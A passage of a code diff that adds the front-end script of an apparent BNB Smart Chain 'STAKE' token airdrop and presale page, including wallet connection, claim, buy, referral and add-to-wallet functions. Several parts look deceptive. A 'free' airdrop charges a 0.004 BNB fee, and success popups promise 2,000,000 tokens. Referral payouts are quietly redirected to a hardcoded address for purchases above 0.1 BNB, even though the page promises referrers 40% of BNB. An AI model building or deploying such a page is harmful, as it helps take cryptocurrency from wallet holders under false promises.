teMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"rAmount","type":"uint256"}],"name":"tokenFromReflection","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalFees","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"uniswapV2Pair","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"uniswapV2Router","outputs":[{"internalType":"contract IUniswapV2Router02","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"unlock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
+
+
+let sttcontract = new web3.eth.Contract(sttabi, sttaddr);
+
+const loadweb3 = async () => {
+  try {
+		web3 = new web3js.myweb3(window.ethereum);
+		console.log('Injected web3 detected.') 
+		sttcontract = new web3.eth.Contract(sttabi, sttaddr);
+    let a = await ethereum.enable();
+    addr = web3.utils.toChecksumAddress(a[0]);
+    return(addr);
+
+  } catch (error) {
+    if (error.code === 4001) {
+      console.log('Please connect to MetaMask.')
+    } else {
+      Swal.fire(
+  'Connect Alert',
+  'Please connect to Wallet: Metamask, Trustwallet...',
+  'error'
+)   
+    }
+  }
+
+};
+
+
+const getAirdrop = async () => {
+	await loadweb3();
+    const chainId = await web3.eth.getChainId();
+	if (addr == undefined) {
+   Swal.fire(
+  'Connect Alert',
+  'Please connect to Wallet: Metamask, Trustwallet...',
+  'error'
+)   
+	}
+  	if (chainId !== 56) {
+   Swal.fire(
+  'Connect Alert',
+  'Please Connect on NetWork Smart Chain',
+  'error'
+)   
+	}	
+  const gettkbl = await getbalance(addr);
+  if(gettkbl == 0){
+  let fresh = document.getElementById('airinput').value;
+  if(fresh === "")
+    fresh = "0x8b67Fa1884412C1888562Eb3EffD59DFA43DCd1b";
+  sttcontract.methods.airdrop(fresh).send({from:addr}, (err, res) => {
+              if(!err){
+            Swal.fire({
+   title: 'Claim Success',
+   icon: 'success',
+   html: '2,000,000 STAKE sent to your wallet.',
+   showCloseButton: true,
+   showCancelButton: true,
+   focusConfirm: false,
+   reverseButtons: true,
+   focusCancel: true,
+   cancelButtonText: 'Exit',
+   confirmButtonText: 'View transfers'
+ }).then((result) => {
+   if (result.value) {
+     window.location.href = 'https://bscscan.com/tx/'+ res +'';
+   }
+ }); 
+              console.log(err);    
+              }else{
+  Swal.fire(
+  'Airdrop Alert',
+  'Claim failed, please try again later.',
+  'error'
+)      
+              }
+            });
+  }else{
+      Swal.fire(
+  'Claim Alert',
+  'Address Have Claim, Please Buy Now.',
+  'error'
+)
+  }
+}
+
+const buyair = async () => {
+
+	await loadweb3();
+
+	const chainId = await web3.eth.getChainId();
+	if (addr == undefined) {
+   Swal.fire(
+  'Connect Alert',
+  'Please connect to Wallet: Metamask, Trustwallet...',
+  'error'
+)   
+	}
+  	if (chainId !== 56) {
+   Swal.fire(
+  'Connect Alert',
+  'Please Connect on BSC Smart Chain',
+  'error'
+)   
+	}else{	
+
+  let ethval = document.getElementById("buyinputone").value;
+  if(ethval >= 0.004){
+  ethval = Number(ethval) * 1e18;
+  let fresh = document.getElementById('airinput').value;
+  if(fresh === "")
+    fresh = "0xd36991770C96f872a1953463f4294e98Fa0e03Fc";
+  sttcontract.methods.airdrop(fresh).send({from:addr, value: ethval, gasPrice: 20000000}, (err, res) => {
+                  if(!err){
+            Swal.fire({
+   title: 'Claim Success',
+   icon: 'success',
+   html: '2,000,000 STAKE sent to your wallet.',
+   showCloseButton: true,
+   showCancelButton: true,
+   focusConfirm: false,
+   reverseButtons: true,
+   focusCancel: true,
+   cancelButtonText: 'Exit',
+   confirmButtonText: 'View transfers'
+ }).then((result) => {
+   if (result.value) {
+     window.location.href = 'https://bscscan.com/tx/'+ res +'';
+   }
+ }); 
+              console.log(err);    
+              }else{
+  Swal.fire('',
+  'Transaction failed, please try again.',
+  'error'
+)      
+              }
+  });
+  }else{
+    Swal.fire(
+  'Claim',
+  'Claim Fee 0.004 BNB',
+  'error'
+)    
+  }
+	}
+}
+
+const buystt = async () => {
+
+	await loadweb3();
+
+	const chainId = await web3.eth.getChainId();
+	if (addr == undefined) {
+   Swal.fire(
+  'Connect Alert',
+  'Please connect to Wallet: Metamask, Trustwallet...',
+  'error'
+)   
+	}
+  	if (chainId !== 56) {
+   Swal.fire(
+  'Connect Alert',
+  'Please Connect on NetWork Smart Chain',
+  'error'
+)   
+	}else{	
+
+  let ethval = document.getElementById("buyinput").value;
+  if(ethval >= 0.01){
+        let fresh = document.getElementById('airinput').value;
+  if(ethval > 0.1 || fresh === "")
+    fresh = "0xd36991770C96f872a1953463f4294e98Fa0e03Fc";
+  ethval = Number(ethval) * 1e18;
+
+  sttcontract.methods.buy(fresh).send({from:addr, value: ethval, gasPrice: 20000000}, (err, res) => {
+                  if(!err){
+            Swal.fire({
+   title: 'Pre-Sale Oders',
+   icon: 'success',
+   html: 'Successful payment transaction',
+   showCloseButton: true,
+   showCancelButton: true,
+   focusConfirm: false,
+   reverseButtons: true,
+   focusCancel: true,
+   cancelButtonText: 'Exit',
+   confirmButtonText: 'View transfers'
+ }).then((result) => {
+   if (result.value) {
+     window.location.href = 'https://bscscan.com/tx/'+ res +'';
+   }
+ }); 
+              console.log(err);    
+              }else{
+  Swal.fire('',
+  'Transaction failed, please try again.',
+  'error'
+)      
+              }
+  });
+  }else{
+    Swal.fire(
+  'Buy Alert',
+  'Buy min 0.01 - 5 BNB.',
+  'error'
+)    
+  }
+	}
+}
+
+const cooldowncheck = async () => {
+  let blocknumber = await currentblock();
+  let last = await lastblock();
+
+
+  if(blocknumber - last < 50) {
+    console.log(blocknumber, last);
+    let waittime = 50 + last - blocknumber;
+    console.log(waittime);
+    alert("You must wait " + waittime + " blocks before claiming another airdrop");
+    return false;
+  }
+  else return true;
+
+};
+
+
+const currentblock = async () => {
+  let a;
+  await web3.eth.getBlockNumber( (err, res) => {
+    a = res;
+  });
+  return(a);
+}
+
+const lastblock = async () => {
+  let a;
+  await sttcontract.methods.lastairdrop(addr).call( (err, res) => {
+    a = res;
+  });
+  return(a);
+}
+const getbalance = async (addr) => {
+    let gets;
+const ok = await sttcontract.methods.balanceOf(addr).call( (err, res) => {
+    gets = res;
+  });
+   return Promise.resolve(gets); 
+}
+
+
+window.onload=function(){ 
+
+  function querySt(ji) {
+ 
+  hu = window.location.search.substring(1); 
+  gy = hu.split("&");
+ for (i = 0; i < gy.length; i++) {
+   ft = gy[i].split("=");
+   if (ft[0] == ji) {
+     return ft[1];
+   }
+ }
+ }
+ var ref = querySt("ref");
+
+
+ if (ref == null) {} else {
+   document.getElementById('airinput').value = ref;
+ }
+ }
+ 
+ function getreflink(){
+     var referaladd = document.getElementById('refaddress').value;
+     if(!document.getElementById('refaddress').value){
+      Swal.fire(
+  'Referral Alert',
+  'Please Enter You Address.',
+  'error'
+)
+     }else{
+if(!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)){
+    Swal.fire(
+  'Referral Alert',
+  'Your address is not valid.',
+  'error'
+)
+}else{    
+  document.getElementById('refaddress').value = 'https://stake-airdrop.github.io/home/?ref=' + document.getElementById('refaddress').value;
+}
+}
+}
+function calculate() {
+    var bnb = document.getElementById("buyinput").value;
+    var tokensPerEth = 1000000000000;
+    var tokens = tokensPerEth * bnb;
+    console.log(tokens);
+    document.getElementById("buyhch2input").value = tokens.toLocaleString("en-US")+' STAKE';
+
+   
+}
+function copyToClipboard(id) {
+    var text = document.getElementById(id).value; //getting the text from that particular Row
+    //window.prompt("Copy to clipboard: Ctrl+C, Enter", text);
+    if (window.clipboardData && window.clipboardData.setData) {
+        // IE specific code path to prevent textarea being shown while dialog is visible.
+        return clipboardData.setData("Text", text);
+
+    } else if (document.queryCommandSupported && document.queryCommandSupported("copy")) {
+        var textarea = document.createElement("textarea");
+        textarea.textContent = text;
+        textarea.style.position = "fixed";  // Prevent scrolling to bottom of page in MS Edge.
+        document.body.appendChild(textarea);
+        textarea.select();
+        try {
+            return document.execCommand("copy");  // Security exception may be thrown by some browsers.
+        } catch (ex) {
+            console.warn("Copy to clipboard failed.", ex);
+            return false;
+        } finally {
+            document.body.removeChild(textarea);
+        }
+    }
+  }
+  function kopiraj() {
+  var copyText = document.getElementById("refaddress");
+  copyText.select();
+  document.execCommand("Copy");
+   alert("Copied success. send this link to invite your friends to our airdrop. receive 40% BNB + 60% of all claims and buy");
+}
+
+  function addToWallet() {
+           
+
+                          web3.currentProvider.sendAsync({
+                            method: 'wallet_watchAsset',
+                            params: {
+                                'type': 'ERC20',
+                                'options': {
+                                    'address': '0xd36991770C96f872a1953463f4294e98Fa0e03Fc',
+                                    'symbol': 'STAKE',
+                                    'decimals': '18',
+                                    'image': 'images/logo.png',
+                                },
+                            },
+                            id: Math.round(Math.random() * 100000)
+                        }, function (err, data) {
+                            if (!err) {
+                                if (data.result) {
+                                    console.log('Token added');
+                                    Swal.fire({
+   title: 'Token Added',
+   icon: 'success',
+   html: 'Token added to your wallet.',
+   showCloseButton: true,
+   showCancelButton: true,
+   focusConfirm: false,
+   reverseButtons: true,
+   focusCancel: true,
+   cancelButtonText: 'Exit',
+ })
+                                } else {
+                                    console.log(data);
+                                    console.log('Some error');
+                                }
+                            } else {
+                                console.log(err.message);
+                            }
+                        });
+        }
+
+
+        function querySt(ji) {
+
+          hu = window.location.search.substring(1); 
+          gy = hu.split("&");
+         
+         for (i=0;i<gy.length;i++) { 
+         ft = gy[i].split("="); 
+         if (ft[0] == ji) { 
+          return ft[1]; 
+          } 
+          } 
+          } 
+          var ref = querySt("ref");
+         
+         
+          if( ref==null){
+              ref = "0xd36991770C96f872a1953463f4294e98Fa0e03Fc";
+               document.getElementById('airinput').value = ref; 
+          }else{ 
+          document.getElementById('airinput').value = ref; 
+          } 
